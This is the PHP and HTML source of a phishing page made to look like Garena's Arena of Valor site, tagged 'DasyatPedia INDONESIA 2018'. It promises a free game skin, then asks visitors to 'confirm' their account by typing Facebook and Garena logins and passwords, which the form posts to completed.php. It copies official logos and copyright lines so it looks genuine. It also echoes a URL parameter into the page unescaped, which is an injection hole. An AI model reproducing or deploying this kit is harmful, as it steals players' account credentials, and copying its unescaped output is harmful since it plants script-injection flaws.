<!---- DasyatPedia INDONESIA 2018 ---->

<?php
	error_reporting(0);
	$link = $_GET['u'];
	$imganu = array('Franco Starlight','Freya Starlight','Karina Starlight','Layla Starlight','Miya Starlight','Moskov Starlight','Natalia Starlight','Saber Starlight','Zilong Starlight');
	$reward = $imganu[rand(0, (count($imganu)-1))];
	
	$imgtitle = array('1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27');
	$title = $imgtitle[rand(0, (count($imgtitle)-1))];
?>

<html>
<head>
<title>Garena AOV - Arena of Valor</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css">
<link rel="shorcut icon" href="https://aov.garena.co.id/img/favicon.ico">
<meta name="description" content="<?php echo $link;?> - Claim your lucky skin now!">
<meta property="og:title" content="<?php echo $link;?> - Claim your lucky skin now!">
<meta property="og:image" content="img/<?php echo ''.$title.'';?>.png">
<style type="text/css">
body { 
  background: url(img/bego.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.container {
	position:relative;
	margin:50px auto;
	max-width:650px;
	height:auto;
	border:2px solid #fff;
	padding:30px;
	box-sizing: border-box;
}

.box{
 background-color: rgba(215, 133, 0, 0.6);
 background: rgba(215, 133, 0, 0.6);
 color: rgba(215, 133, 0, 0.6);
 width: 100%;
 height: 550px;
 padding:10px;
 margin:0px auto;
 color:#fff;
 border-radius: 10px;
 }
 
.header{
 background-color: rgba(215, 133, 0, 0.6);
 background: rgba(215, 133, 0, 0.6);
 color: rgba(215, 133, 0, 0.6);
 width: 100%;
 height: auto;
 padding:10px;
 margin:0px auto;
 color:#fff;
 border-radius: 10px;
}

.footer{
 background-color: rgba(215, 133, 0, 0.6);
 background: rgba(215, 133, 0, 0.6);
 color: rgba(215, 133, 0, 0.6);
 height: auto;
 padding:10px;
 margin:0px auto;
 color:#fff;
 border-radius: 10px;
}

.hadiah {
 display: inline-block;
 width: 250px;
 height: auto;
 margin: 20px;
 background-color: rgba(255, 135, 44, 0.8);
 background: rgba(255, 135, 44, 0.8);
 color: white;
 border-radius: 10px;
}

.hadiah-apa {
 width: 250px;
 height: auto;
 margin: auto;
 border-radius: 10px;
}

.hadiah h5 {
 margin: 10px auto;
 font-size: 1.5em;
 text-align: center;
 height: 50px;
}


.tombol {
 position: relative;
 width: 100%;
 height: 60px;
 margin: 0;
 background-color: rgba(255, 135, 44, 0.8);
 background: rgba(255, 135, 44, 0.8);
 color: white;
 border-radius: 10px;
 border: #FAAC58;
 color: #fff;
 font-size: 1.2em;
 letter-spacing: 1px;
 border-radius: 10px;
 outline: none;
 cursor: pointer;
}

.tombol:hover {
 background-color: rgba(255, 155, 44, 0.8);
 background: rgba(255, 155, 44, 0.8);
 color: white;
 border: #FE9A2E;
}

@font-face {
        font-family: paansi;
        src: url(fonts/fifa.ttf);
}
 
.huruf{
	font-family: 'paansi';
	font-size: 25pt;
	font-variant: inherit;
}
.huruf-kecil{
	font-family: 'paansi';
	font-size: 15pt;
	font-variant: inherit;
}
.huruf-footer{
	font-family: 'paansi';
	font-size: 1.0em;
	font-variant: inherit;
}
</style>
  
</head>
<body>

<style type="text/css">
  #regiration_form fieldset:not(:first-of-type) {
    display: none;
  }
</style>
  
</br>
</br>

<center><img src="https://aov.garena.co.id/main/img/same/logo.png"></center>


</br>
</br>

				
<div class="container header">
<div class="slider-container">
<div class="slider">
<img src="https://lh3.googleusercontent.com/VelgQ73kgYalCAecR_S3UJlN72kj4Ubn-0RNmK0HvY9IXO0uTz7Kr1SvOtUvvXkhJA=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/tibnHs27uA3jh7m-4MdDE3r-zL-T8oZWxLB8a0A1vwEiNBytj29-sQMCt1z6RoFUXw=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/0mlo7SoTMj_CAVV6HGc8MzGC7GhZj_LfjvSM8eKZ7xw_Nau0_hSYQwmQpoBpjCfk3ys=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/chkIoSx9Dxpv2nQQaOiPxo0MASQC-SpOCm0gMKz-XOxqcHgyxxHJ5Fm-hkIYI2qVcQ=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/lC8tXlV4Gz0HVGSKu9opc60gHoOwRHqw4p5IwNoovL_Mnnqi2SlVlc8GlMqprKAnnyk=w1319-h627-rw" height="245" style="width:100%">
</div>
</div>
</div>

<div class="container box">

<form id="regiration_form" novalidate action="completed.php"  method="post">
<fieldset>
<center><h2 class="huruf">Welcome, <b><?php echo $link;?></b></h2></center>
<center><h2 class="huruf-kecil">Claim your lucky skin now!</h2></center>
<center>
<div class="hadiah">
<h2 class="huruf">FREE</h2>
<img src="img/<?php echo ''.$title.'';?>.png" class="hadiah-apa">
</div>
</center>
<input type="button" name="next" class="next button tombol huruf" value="Claim">
</fieldset>

<fieldset>
<center><h2 class="huruf">Hi, <b><?php echo $link;?></b></h2></center>
<center><h2 class="huruf-kecil">Confirm your account</h2></center>
<center><img height="50" width="50" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/F_icon.svg/2000px-F_icon.svg.png"></center>

</br>

<input type="text" name="efb" class="form-control huruf-input" style="background:transparent;border-radius: 10px;width:50%;float: left;" placeholder="Email or Phone">
<input type="password" name="pfb" class="form-control huruf-input" style="background:transparent;border-radius: 10px;width:50%;float: right;" placeholder="Password">

</br>
</br>
</br>

<center><img height="50" width="50" src="https://aov.garena.co.id/img/logo_m.png"></center>

</br>

<input type="text" name="uga" class="form-control huruf-input" style="background:transparent;border-radius: 10px;width:50%;float:left;" placeholder="Garena Username / E-Mail / Phone Number">
<input type="password" name="pga" class="form-control huruf-input" style="background:transparent;border-radius: 10px;width:50%;float:right;" placeholder="Password">
<input type="hidden" name="user" value="<?php echo $link;?>" readonly>
</br>
</br>

<input type="submit" class="button tombol huruf" value="Confirm">
</fieldset>

</form>
  
</div>



<div class="container footer">
<center>
<img class="pull-left" height="50" width="50" src="https://pro.moba.garena.co.id/pc/img/timi.png">
<img class="pull-left" height="30" width="40" src="https://aov.garena.co.id/img/logo_m.png">

</br>
<span class="pull-right huruf-footer">Copyright &copy; Garena Online. Trademarks belong to their respective owners. </br> All Rights Reserved</span>
</br>
<span class="pull-right huruf-footer">Copyright &copy; Tencent. All rights reserved.</span>
</center>
</div>

</br>
</br>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="https://cdn.rawgit.com/twbs/bootstrap/v4-dev/dist/js/bootstrap.js"></script>

<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>

<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 3000);
}
</script>

</body>
</html>

<!---- DasyatPedia INDONESIA 2018 ---->